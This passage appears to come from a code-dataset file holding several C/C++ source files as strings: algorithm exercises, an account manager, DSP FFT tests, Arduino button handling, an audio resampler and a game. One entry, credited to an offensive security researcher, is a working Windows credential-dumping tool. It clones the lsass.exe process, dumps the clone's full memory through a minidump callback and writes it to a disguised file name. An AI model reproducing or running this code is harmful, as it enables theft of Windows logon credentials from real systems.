child_pids.push_back(pid);\n    close(write_pipe);\n}\n\nvoid create_water_process(vector <int>& child_pids ,string address , vector<vector<int>>& water){\n    i",
    "// Author: Offensive-Panda\n// Offensive Security Researcher\n#include <windows.h>\n#include \"header.h\"\n#include <DbgHelp.h>\n#include <tlhelp32.h>\n\n#pragma comment (lib, \"Dbghelp.lib\")\n\n\nLPVOID dBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);\nDWORD bRead = 0;\n\n\nDWORD GetProcessIdByName(LPCUWSTR procname) {\n\tDWORD pid = 0;\n\tHANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tif (hProcSnap == INVALID_HANDLE_VALUE) {\n\t\treturn 0;\n\t}\n\n\tPROCESSENTRY32W pe32;\n\tpe32.dwSize = sizeof(pe32);\n\n\tif (!Process32FirstW(hProcSnap, &pe32)) {\n\t\tCloseHandle(hProcSnap);\n\t\treturn 0;\n\t}\n\n\twhile (Process32NextW(hProcSnap, &pe32)) {\n\t\tif (lstrcmpiW(procname, pe32.szExeFile) == 0) {\n\t\t\tpid = pe32.th32ProcessID;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tCloseHandle(hProcSnap);\n\treturn pid;\n}\n\nBOOL CALLBACK minidumpCallback(\n\t__in     PVOID callbackParam,\n\t__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,\n\t__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput\n)\n{\n\tLPVOID destination = 0, source = 0;\n\tDWORD bufferSize = 0;\n\n\tswitch (callbackInput->CallbackType)\n\t{\n\tcase IoStartCallback:\n\t\tcallbackOutput->Status = S_FALSE;\n\t\tbreak;\n\tcase IoWriteAllCallback:\n\t\tcallbackOutput->Status = S_OK;\n\t\tsource = callbackInput->Io.Buffer;\n\t\tdestination = (LPVOID)((DWORD_PTR)dBuf + (DWORD_PTR)callbackInput->Io.Offset);\n\t\tbufferSize = callbackInput->Io.BufferBytes;\n\t\tbRead += bufferSize;\n\n\t\tRtlCopyMemory(destination, source, bufferSize);\n\n\t\tbreak;\n\n\tcase IoFinishCallback:\n\t\tcallbackOutput->Status = S_OK;\n\t\tbreak;\n\n\tdefault:\n\t\treturn true;\n\t}\n\treturn TRUE;\n}\n\nint main(int argc, char** argv)\n{\n\tint returnCode;\n\tHANDLE dumpFile = NULL;\n\tDWORD bytesWritten = 0;\n\tDWORD Pid = GetProcessIdByName(L\"lsass.exe\");\n\tif (Pid == 0)\n\t{\n\t\tprintf(\"Could not find lsass.exe PID \\n\");\n\t\treturn -1;\n\t}\n\n\tstd::cout << \"Lsass PID: \" << Pid << std::endl;\n\n\tHANDLE victimHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid);\n\tif (victimHandle == nullptr)\n\t{\n\t\t\n\t\tprintf(\"Could not open a handle to lsass.exe \\n\");\n\t\treturn -1;\n\t}\n\n\tprintf(\"Got a handle to lsass.exe succesfuly \\n\");\n\n\n\n\tHMODULE lib = LoadLibraryA(\"ntdll.dll\");\n\tif (!lib)\n\t{\n\t\tprintf(\"Could not load ntdll.dll \\n\");\n\t\treturn -1;\n\t}\n\n\tRtlCreateProcessReflectionFunc RtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)GetProcAddress(lib, \"RtlCreateProcessReflection\");\n\tif (!RtlCreateProcessReflection)\n\t{\n\t\tprintf(\"Could not find RtlCreateProcessReflection in ntdll.dll \\n\");\n\t\treturn -1;\n\t}\n\n\tT_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };\n\tNTSTATUS reflectRet = RtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &info);\n\tif (reflectRet == STATUS_SUCCESS) {\n\t\tDWORD newPID = (DWORD)info.ReflectionClientId.UniqueProcess;\n\t\tprintf(\"Succesfully Mirrored to lsass.exe \\n\");\n\t\tstd::cout << \"Lsass PID: \" << newPID << std::endl;\n\t\tHANDLE newHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, newPID);\n\t\tif (newHandle == nullptr)\n\t\t{\n\n\t\t\tprintf(\"Could not open a handle to lsass.exe \\n\");\n\t\t\treturn -1;\n\t\t}\n\n\t\tprintf(\"Got a handle of Mirrored lsass.exe succesfuly \\n\");\n\n\t\tSleep(5000);\n\n\t\t// Set up minidump callback\n\t\tMINIDUMP_CALLBACK_INFORMATION callbackInfo;\n\t\tZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));\n\t\tcallbackInfo.CallbackRoutine = &minidumpCallback;\n\t\tcallbackInfo.CallbackParam = NULL;\n\n\n\t\tif (MiniDumpWriteDump(newHandle, newPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo) == FALSE)\n\t\t{\n\t\t\tprintf(\"Failed to create a dump of the forked process \\n\");\n\t\t\treturn 1;\n\n\t\t}\n\n\t\tprintf(\"Successfully created dump of the forked process \\n\");\n\n\t\tstd::string dumpFileName = \"f.elif\";\n\n\t\tdumpFile = CreateFileA(dumpFileName.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n\n\t\tif (dumpFile == INVALID_HANDLE_VALUE)\n\t\t{\n\t\t\tprintf(\"Failed to create dump file \\n\");\n\t\t\treturn 1;\n\t\t}\n\n\t\tprintf(\"Successfully initialized dump file \\n\");\n\n\t\tif (WriteFile(dumpFile, dBuf, bRead, &bytesWritten, NULL))\n\t\t{\n\t\t\treturnCode = TRUE;\n\t\t\tprintf(\"Successfully dumped lsass process \\n\");\n\n\t\t\tSleep(5000);\n\n\t\t\tprintf(\"Checking if file exists and greater than 5MBs \\n\");\n\n\t\t\tWIN32_FILE_ATTRIBUTE_DATA fileInfo;\n\t\t\tif (GetFileAttributesExA(dumpFileName.c_str(), GetFileExInfoStandard, &fileInfo) == 0)\n\t\t\t{\n\t\t\t\tprintf(\"Failed to get file attributes\");\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\tstd::cout << \"High Order File Size: \" << fileInfo.nFileSizeHigh << std::endl;\\\n\t\t\tstd::cout << \"Low Order File Size: \" << fileInfo.nFileSizeLow << std::endl;\n\n\t\t\tif (fileInfo.nFileSizeHigh == 0 && fileInfo.nFileSizeLow < 1024 * 1024 * 5)\n\t\t\t{\n\t\t\t\tprintf(\"File size is less than 5MBs \\n\");\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\tprintf(\"File exists and size is greater than 5MBs \\n\");\n\t\t}\n\t\telse\n\t\t{\n\t\t\tprintf(\"Failed to write dump to disk \\n\");\n\t\t\treturn 1;\n\t\t}\n\n\t\t// Terminate the new lsass.exe process\n\t\tHANDLE hNewProcess = OpenProcess(PROCESS_TERMINATE, FALSE, newPID);\n\t\tif (hNewProcess == NULL) {\n\t\t\tprintf(\"Failed to open new lsass.exe process \\n\");\n\t\t\treturn 1;\n\t\t}\n\t\tif (!TerminateProces",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\n///brute soln\r\n\r\n\r\npair<int,int> twoSum(int arr[] , int n , int target) {\r\n    \r\n\r\n    for(int i=0;i<n;i++) {\r\n        for(int j=i+1;j<n;j++) {\r\n            if(arr[i] + arr[j] == target) {\r\n                return {i,j};\r\n\r\n            }\r\n        }\r\n    }\r\n    return {-1,-1};\r\n} \r\nint main () {\r\n    int target = 9;\r\n    int n =5;\r\n    int arr[] = {2,7,11,15,3};\r\n\r\n    pair<int,int> result = twoSum(arr , n , target);\r\n\r\n   if (result.first != -1) {\r\n        cout << \"Indices: \" << result.first << \", \" << result.second << endl;\r\n    } else {\r\n        cout << \"No two numbers found that add up to the target.\" << endl;\r\n    }\r\n\r\n    return 0;\r\n\r\n\r\n}\r\n\r\n///better soln\r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <map>\r\n\r\nusing namespace std;\r\n\r\nvector<int> twoSum(vector<int>& nums, int target) {\r\n    map<int, int> mpp; // Map to store numbers and their indices\r\n    int n = nums.size(); // Size of the input array\r\n\r\n    for (int i = 0; i < n; i++) {\r\n        int num = nums[i]; // Current number\r\n        int moreneed = target - num; // The number needed to reach the target\r\n\r\n        // If the complementary number is already in the map\r\n        if (mpp.find(moreneed) != mpp.end()) {\r\n            return {mpp[moreneed], i}; // Return the indices of the two numbers\r\n        }\r\n\r\n        // Otherwise, store the current number and its index in the map\r\n        mpp[num] = i;\r\n    }\r\n\r\n    // If no pair is found, return {-1, -1}\r\n    return {-1, -1};\r\n}\r\n\r\nint main() {\r\n    vector<int> nums = {2, 7, 11, 15}; // Input array\r\n    int target = 9; // Target sum\r\n\r\n    vector<int> result = twoSum(nums, target); // Call the twoSum function\r\n\r\n    // Print the result\r\n    if (result[0] != -1) {\r\n        cout << \"Indices: \" << result[0] << \", \" << result[1] << endl;\r\n    } else {\r\n        cout << \"No two numbers add up to the target.\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n\r\n//optimised soln\r\n\r\n\r\n\r\nstring read(int n, vector<int> book, int target) {\r\n    int left = 0;\r\n    int right = n - 1; // Corrected the right variable declaration\r\n\r\n    // Sort the array to apply two-pointer technique\r\n    sort(book.begin(), book.end());\r\n\r\n    // Apply two-pointer approach to find if the target can be achieved\r\n    while (left < right) {\r\n        int sum = book[left] + book[right];\r\n        \r\n        if (sum == target) {\r\n            return \"YES\"; // Return \"YES\" if two numbers sum to target\r\n        } \r\n        else if (sum < target) {\r\n            left++; // Move left pointer to the right if the sum is less than the target\r\n        } \r\n        else {\r\n            right--; // Move right pointer to the left if the sum is more than the target\r\n        }\r\n    }\r\n\r\n    // If no such pair is found, return \"NO\"\r\n    return \"NO\";\r\n}\r\n\r\nint main() {\r\n    vector<int> book = {3, 5, 1, 7, 9}; // Example input\r\n    int target = 10;\r\n    int n = book.size();\r\n\r\n    cout << read(n, book, target) << endl; // Calling the read function\r\n    return 0;\r\n}\r\n",
    "\ufeff#include \"account.h\"\r\n\r\nint main() {\r\n    vector<Account> accounts; // vector containing Account objects(accounts)\r\n\r\n    // Reading accounts\r\n    ifstream accounts_reader;\r\n    accounts_reader.open(\"../resources/accounts.txt\");\r\n\r\n    if (!accounts_reader.is_open()) {\r\n        cerr << \"Error: Unable to open the accounts file.\" << endl;\r\n        return 1; // Exit the program with an error code\r\n    }\r\n\r\n    unsigned short num_of_accounts;\r\n    accounts_reader >> num_of_accounts;\r\n\r\n    unsigned short i = 0;\r\n    while (i < num_of_accounts) {\r\n        string name;\r\n        double coef;\r\n        double balance;\r\n        accounts_reader >> name;\r\n        accounts_reader >> coef;\r\n        accounts_reader >> balance;\r\n        accounts.emplace_back(i, name, coef, balance); // Construct a new account with the ID = i and append it to the vector\r\n        i++;\r\n    }\r\n    accounts_reader.close();\r\n    ofstream fout;\r\n    ifstream fin;\r\n\r\n    cout << \"WELCOME HOME, MASTER\" << endl;\r\n\r\n    while (true) {\r\n        double total = 0.0;\r\n        for (i = 0; i < num_of_accounts; i++) {\r\n            accounts[i].display(); // Display all accounts, building the total\r\n            total += accounts[i].get_balance();\r\n        }\r\n        cout << \"What do you want to do?\" << endl;\r\n        cout << \"1 - Income\" << endl;\r\n        cout << \"2 - Withdrawal\" << endl;\r\n        cout << \"q - quit\" << endl;\r\n        char op;\r\n        cin >> op;\r\n        cout << endl;\r\n\r\n        double sum;\r\n\r\n        switch ((int)op)\r\n        {\r\n        case '1':\r\n            cout << \"Sum: \";\r\n            cin >> sum;\r\n            for (i = 0; i < num_of_accounts; i++) {\r\n                accounts[i].income(sum);\r\n            }\r\n            total += sum;\r\n            break;\r\n\r\n        case '2':\r\n            cout << \"Which account do you want to withdraw from?\" << endl;\r\n            for (i = 0; i < num_of_accounts; i++) {\r\n                cout << i << \" - \" << accounts[i].get_name() << endl; // Get accounts by their ID\r\n            }\r\n\r\n            unsigned short choice;\r\n            cin >> choice;\r\n            cout << \"How much would you like to withdraw from \" << accounts[choice].get_name() << \" ? \";\r\n            cin >> sum;\r\n            accounts[choice].withdrawal(sum);\r\n            break;\r\n\r\n        case 'q':\r\n            exit(0);\r\n        default:\r\n            cout << \"Invalid operation. Try again.\" << endl << \"To quit, type 'q' and press ENTER.\" << endl;\r\n            break;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include \"TransformRQ31.h\"\n#include <stdio.h>\n#include \"Error.h\"\n#include \"arm_math.h\"\n#include \"arm_const_structs.h\"\n#include \"Test.h\"\n\n\n#define SNR_THRESHOLD 90\n\n\n\n    void TransformRQ31::test_rfft_q31()\n    {\n       q31_t *inp = input.ptr();\n\n       q31_t *tmp = inputchanged.ptr();\n\n       q31_t *outp = outputfft.ptr();\n       q31_t *overoutp = overheadoutputfft.ptr();\n\n\n       memcpy(tmp,inp,sizeof(q31_t)*input.nbSamples());\n\n       arm_rfft_q31(\n             &this->instRfftQ31,\n             tmp,\n             overoutp);\n\n       if (this->ifft)\n       {\n          for(int i = 0;i < overheadoutputfft.nbSamples(); i++)\n          {\n              overoutp[i] = overoutp[i] << this->scaling;\n          }\n       }\n\n\n       memcpy(outp,overoutp,sizeof(q31_t)*outputfft.nbSamples());\n\n       ASSERT_SNR(outputfft,ref,(q31_t)SNR_THRESHOLD);\n       ASSERT_EMPTY_TAIL(outputfft);\n\n        \n    } \n\n  \n    void TransformRQ31::setUp(Testing::testID_t id,std::vector<Testing::param_t>& paramsArgs,Client::PatternMgr *mgr)\n    {\n\n\n       \n\n       switch(id)\n       {\n\n          case TransformRQ31::TEST_RFFT_Q31_1:\n\n            input.reload(TransformRQ31::INPUTS_RFFT_NOISY_32_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::REF_RFFT_NOISY_32_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,32,0,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=0;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_17:\n\n            input.reload(TransformRQ31::INPUTS_RIFFT_NOISY_32_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::INPUTS_RFFT_NOISY_32_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,32,1,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=1;\n            this->scaling=5;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_2:\n\n            input.reload(TransformRQ31::INPUTS_RFFT_NOISY_64_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::REF_RFFT_NOISY_64_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,64,0,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=0;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_18:\n\n            input.reload(TransformRQ31::INPUTS_RIFFT_NOISY_64_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::INPUTS_RFFT_NOISY_64_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,64,1,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=1;\n            this->scaling=6;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_3:\n\n            input.reload(TransformRQ31::INPUTS_RFFT_NOISY_128_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::REF_RFFT_NOISY_128_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,128,0,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=0;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_19:\n\n            input.reload(TransformRQ31::INPUTS_RIFFT_NOISY_128_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::INPUTS_RFFT_NOISY_128_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,128,1,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=1;\n            this->scaling=7;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_4:\n\n            input.reload(TransformRQ31::INPUTS_RFFT_NOISY_256_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::REF_RFFT_NOISY_256_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,256,0,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=0;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_20:\n\n            input.reload(TransformRQ31::INPUTS_RIFFT_NOISY_256_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::INPUTS_RFFT_NOISY_256_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,256,1,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=1;\n            this->scaling=8;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_5:\n\n            input.reload(TransformRQ31::INPUTS_RFFT_NOISY_512_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::REF_RFFT_NOISY_512_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,512,0,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,mgr);\n\n            this->ifft=0;\n\n          break;\n\n          case TransformRQ31::TEST_RFFT_Q31_21:\n\n            input.reload(TransformRQ31::INPUTS_RIFFT_NOISY_512_Q31_ID,mgr);\n            ref.reload(  TransformRQ31::INPUTS_RFFT_NOISY_512_Q31_ID,mgr);\n\n            arm_rfft_init_q31(&this->instRfftQ31 ,512,1,1);\n\n            inputchanged.create(input.nbSamples(),TransformRQ31::TEMP_Q31_ID,",
    "#include \"buttons.h\" // Handling button presses\n\nextern volatile int buttonNumber;  // Used for communicating button number state\nextern bool gameStarted;  // References the variable defined in the main program\nunsigned long buttonPressStartTime = 0;   // Store the start time of the button press\nbool buttonBeingHeld = false;  // Variable to track if the button is being held down\n\n////////// DEBOUNCE //////////\nunsigned long lastDebounceTime = 0;\nconst unsigned long debounceDelay = 300;  // 300 milliseconds debounce delay\n\n////////// BUTTON AND INTERRUPT INITIALIZATION //////////\nvoid initButtonsAndButtonInterrupts(void) {\n    // Initialize the game buttons (pins 2-5) as inputs\n    for (byte pin = firstPin; pin <= lastPin; pin++) {\n        pinMode(pin, INPUT_PULLUP);  // Internal pull-up resistor enabled\n    }\n\n    // Enable Pin Change Interrupt for port D (pins 2-5)\n    PCICR |= (1 << PCIE2);  // Enable pin change interrupts for port D (pin 16-23)\n    PCMSK2 |= (1 << PCINT18) | (1 << PCINT19) | (1 << PCINT20) | (1 << PCINT21); // Enable interrupts\n    // for pins 2, 3, 4, and 5 to detect changes\n}\n\n////////// INTERRUPT HANDLING AND DEBOUNCING //////////\nISR(PCINT2_vect) {\n    // Check if the debounce time has elapsed\n    unsigned long currentTime = millis();\n    if ((currentTime - lastDebounceTime) > debounceDelay) {\n        // Check which button is pressed and update buttonNumber\n        for (byte pin = firstPin; pin <= lastPin; pin++) {\n            if (digitalRead(pin) == LOW) {  // If the button is pressed\n                buttonNumber = pin;  // Update buttonNumber\n                lastDebounceTime = currentTime;  // Update debounce timer\n                break;  // Stop checking at the first pressed button\n            }\n        }\n    }\n}\n",
    "#include \"resampler.h\"\n\nnamespace resampler {\n\nResampler::~Resampler() {\n  if (this->resampler_ != nullptr) {\n    resampleFree(this->resampler_);\n  }\n\n  if (this->float_input_buffer_ != nullptr) {\n    free(this->float_input_buffer_);\n  }\n  if (this->float_output_buffer_ != nullptr) {\n    free(this->float_output_buffer_);\n  }\n};\n\nbool Resampler::initialize(float target_sample_rate, float source_sample_rate, uint8_t channels,\n                           uint16_t number_of_taps, uint16_t number_of_filters, bool use_pre_post_filter,\n                           bool subsample_interpolate) {\n  this->channels_ = channels;\n  this->number_of_taps_ = number_of_taps;\n  this->number_of_filters_ = number_of_filters;\n\n  this->float_input_buffer_ =\n      (float *) heap_caps_malloc(this->input_buffer_samples_ * sizeof(float), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);\n\n  this->float_output_buffer_ =\n      (float *) heap_caps_malloc(this->output_buffer_samples_ * sizeof(float), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);\n\n  if ((this->float_input_buffer_ == nullptr) || (this->float_output_buffer_ == nullptr)) {\n    return false;\n  }\n\n  int flags = 0;\n\n  if (subsample_interpolate) {\n    flags |= SUBSAMPLE_INTERPOLATE;\n  }\n\n  this->sample_ratio_ = target_sample_rate / source_sample_rate;\n\n  if (this->sample_ratio_ < 1.0) {\n    this->lowpass_ratio_ -= (10.24 / this->number_of_taps_);\n\n    if (this->lowpass_ratio_ < 0.84) {\n      this->lowpass_ratio_ = 0.84;\n    }\n\n    if (this->lowpass_ratio_ < this->sample_ratio_) {\n      // avoid discontinuities near unity sample ratios\n      this->lowpass_ratio_ = this->sample_ratio_;\n    }\n  }\n  if (this->lowpass_ratio_ * this->sample_ratio_ < 0.98 && use_pre_post_filter) {\n    float cutoff = this->lowpass_ratio_ * this->sample_ratio_ / 2.0;\n    biquad_lowpass(&this->lowpass_coeff_, cutoff);\n    this->pre_filter_ = true;\n  }\n\n  if (this->lowpass_ratio_ / this->sample_ratio_ < 0.98 && use_pre_post_filter && !this->pre_filter_) {\n    float cutoff = this->lowpass_ratio_ / this->sample_ratio_ / 2.0;\n    biquad_lowpass(&this->lowpass_coeff_, cutoff);\n    this->post_filter_ = true;\n  }\n\n  if (this->pre_filter_ || this->post_filter_) {\n    for (int i = 0; i < this->channels_; ++i) {\n      biquad_init(&this->lowpass_[i][0], &this->lowpass_coeff_, 1.0);\n      biquad_init(&this->lowpass_[i][1], &this->lowpass_coeff_, 1.0);\n    }\n  }\n\n  if (this->sample_ratio_ < 1.0) {\n    this->resampler_ = resampleInit(this->channels_, this->number_of_taps_, this->number_of_filters_,\n                                    this->sample_ratio_ * this->lowpass_ratio_, flags | INCLUDE_LOWPASS);\n  } else if (this->lowpass_ratio_ < 1.0) {\n    this->resampler_ = resampleInit(this->channels_, this->number_of_taps_, this->number_of_filters_,\n                                    this->lowpass_ratio_, flags | INCLUDE_LOWPASS);\n  } else {\n    this->resampler_ = resampleInit(this->channels_, this->number_of_taps_, this->number_of_filters_, 1.0, flags);\n  }\n\n  resampleAdvancePosition(this->resampler_, this->number_of_taps_ / 2.0);\n\n  return true;\n}\n\nvoid Resampler::resample(const int16_t *input, int16_t *output, size_t input_frames_available,\n                         size_t output_frames_free, size_t &frames_used, size_t &frames_generated) {\n  unsigned int necessary_frames = resampleGetRequiredSamples(this->resampler_, output_frames_free, this->sample_ratio_);\n\n  unsigned int frames_to_process = std::min(input_frames_available, necessary_frames);\n\n  for (unsigned int i = 0; i < frames_to_process * this->channels_; ++i) {\n    this->float_input_buffer_[i] = static_cast<float>(input[i]) / 32768.0f;\n  }\n\n  if (this->pre_filter_) {\n    for (int i = 0; i < this->channels_; ++i) {\n      biquad_apply_buffer(&this->lowpass_[i][0], this->float_input_buffer_ + i, frames_to_process, this->channels_);\n      biquad_apply_buffer(&this->lowpass_[i][1], this->float_input_buffer_ + i, frames_to_process, this->channels_);\n    }\n  }\n\n  ResampleResult res = resampleProcessInterleaved(this->resampler_, this->float_input_buffer_, frames_to_process,\n                                                  this->float_output_buffer_, output_frames_free, this->sample_ratio_);\n\n  frames_generated = res.output_generated;\n\n  if (this->post_filter_) {\n    for (int i = 0; i < this->channels_; ++i) {\n      biquad_apply_buffer(&this->lowpass_[i][0], this->float_output_buffer_ + i, frames_generated, this->channels_);\n      biquad_apply_buffer(&this->lowpass_[i][1], this->float_output_buffer_ + i, frames_generated, this->channels_);\n    }\n  }\n\n  frames_used = res.input_used;\n\n  const size_t samples_generated = frames_generated * this->channels_;\n  for (size_t i = 0; i < samples_generated; ++i) {\n    const float sample = this->float_output_buffer_[i];\n    if (sample >= 1.0f) {\n      output[i] = 32767;\n    } else if (sample < -1.0f) {\n      output[i] = -32768;\n    } else {\n      output[i] = static_cast<int16_t>(sample * 32768);\n    }\n  }\n}\n\n}  // namespace resampler",
    "#include \"Game.h\"\n#include <fstream>\n#include <iostream>\n#include \"env_fixes.h\"\n\n// block 1500 790\n// block 1800 690\n// block 1900 690\n// block 2000 690\n// block 2100 590\n// block 2400 490\n// block 2800 390\n// block 3100 290\n// block 3200 290\n// block 3300 290\n// block 3400 290\n// block 3500 290\n// block 3600 290\n// block 3700 290\nGame::Game() :  window(nullptr),\nevent{}\n// ,isAlive(true)\n, totalDistanceTraveled(0.0f)\n{\n    this->initWindow();\n    ground=Ground(*this->window);\n    // ground.initGround();\n    player=Player(ground.getGroundPos());\n    this->background.loadFromFile(\"../images/background1-3.png\");\n    this->backgroundSprite.setTexture(this->background);\n    this->backgroundSprite.setPosition(0.0f, 0.0f);\n    this->backgroundSprite.setScale(\n        static_cast<float>(this->window->getSize().x) / static_cast<float>(this->background.getSize().x),\n        static_cast<float>(this->window->getSize().y) / static_cast<float>(this->background.getSize().y)\n    );\n    this->backgroundSprite.setColor(sf::Color::Blue);\n    this->buffer.loadFromFile(\"../sound/level_soundtrack.ogg\");\n    this->music.setBuffer(this->buffer);\n    music.play();\n    this->view.setCenter(player.getPosition().x+620.0f,player.getPosition().y-250.0f);\n    this->view.setSize(1920.0f, 1080.0f);\n    this->window->setView(this->view);\n    this->loadChunks();\n}\nbool Game::isRunning() const {\n    return this->window->isOpen();\n}\n\nvoid Game::initWindow()  {\n    this->videoMode.width=1920;\n    this->videoMode.height=1080;\n    this->window = new sf::RenderWindow(this->videoMode,\"GDash\",sf::Style::Default);\n    this->window->setPosition(sf::Vector2i(0,0));\n    this->window->setFramerateLimit(60);\n    // this->window->setFramerateLimit(144);\n    this->window->setPosition(sf::Vector2i(0,0));\n}\n\nvoid Game::pollEvents() {\n    bool shouldExit = false;\n    init_threads();\n    while(this->window->pollEvent(this->event)) {\n        if(this->event.type == sf::Event::Closed) {\n            shouldExit = true;\n        }\n        if(this->event.type == sf::Event::KeyPressed) {\n            if(this->event.key.code == sf::Keyboard::Escape) {\n                shouldExit = true;\n        }\n        break;\n        }\n    }\n    if(shouldExit) {\n        this->window->close();\n    }\n}\nvoid Game :: update() {\n    this->pollEvents();\n    this->deltaTime=std::min(getDeltaTime(),1./60.f);\n    // this->deltaTime=std::min(getDeltaTime(),1./144.f);\n    this->player.updatePlayer(this->deltaTime,ground);\n    this->totalDistanceTraveled += 10.0f*this->velocity*this->deltaTime;\n    this->ground.updateGround(-this->velocity,this->deltaTime);\n    this->updateObstacles();\n    for(const auto& obstacle : this->obstacles) {\n        this->player.checkCollisionObstacle(endGame,this->deltaTime,this->velocity,obstacle);\n    }\n    this->updateView();\n    std::cout<<deltaTime<<\"\\n\";\n    if(endGame)\n        window->close();\n}\ndouble Game::getDeltaTime() {\n    return this->clock.restart().asSeconds();\n}\n\nvoid Game::loadChunks() {\n    std::ifstream fin(\"../obstacole.in\");\n    if(!fin.is_open()) {\n    std::cout<<\"File cant open\"<<std::endl;\n        return;\n    }\n    Chunk currentChunk=Chunk(0.0f,chunkSize);\n    std::string objtype;\n    float x,y;\n    while(fin>>objtype>>x>>y) {\n        if(x>=currentChunk.getStartX()&&x<currentChunk.getEndX()) {\n        // ObstacleType type=(objtype==\"block\")?ObstacleType::BLOCK :ObstacleType::SPIKE;\n            ObstacleType type;\n            if(objtype==\"block\")\n                type=ObstacleType::BLOCK;\n            else if(objtype==\"spike\")\n                type=ObstacleType::SPIKE;\n            else if(objtype==\"short\")\n                type=ObstacleType::SPIKE_SHORT;\n            else if(objtype==\"platform\")\n                type=ObstacleType::PLATFORM;\n            else if(objtype==\"end\")\n                type=ObstacleType::END;\n            else\n                continue;\n            currentChunk.addObstacle(Obstacle(type,sf::Vector2f(x,y)));\n        }\n        else {\n            chunks.push_back(currentChunk);\n            currentChunk=Chunk(currentChunk.getEndX(),chunkSize);\n            if(x>=currentChunk.getStartX()&&x<currentChunk.getEndX()) {\n                ObstacleType type;\n                if(objtype==\"block\")\n                    type=ObstacleType::BLOCK;\n                else if(objtype==\"spike\")\n                    type=ObstacleType::SPIKE;\n                else if(objtype==\"short\")\n                    type=ObstacleType::SPIKE_SHORT;\n                else if(objtype==\"platform\")\n                    type=ObstacleType::PLATFORM;\n                else if(objtype==\"end\")\n                    type=ObstacleType::END;\n                else\n                    continue;\n                currentChunk.addObstacle(Obstacle(type,sf::Vector2f(x,y)));\n            }\n        }\n    }\n    chunks.push_back(currentChunk);\n}\n\n// void Game::updateView() {\n//     if(player.getPosition().y<300.0f) {\n//         view.setCenter(player.getPosition());\n//     }\n// }\nvoid Game::updateView() {\n    ",
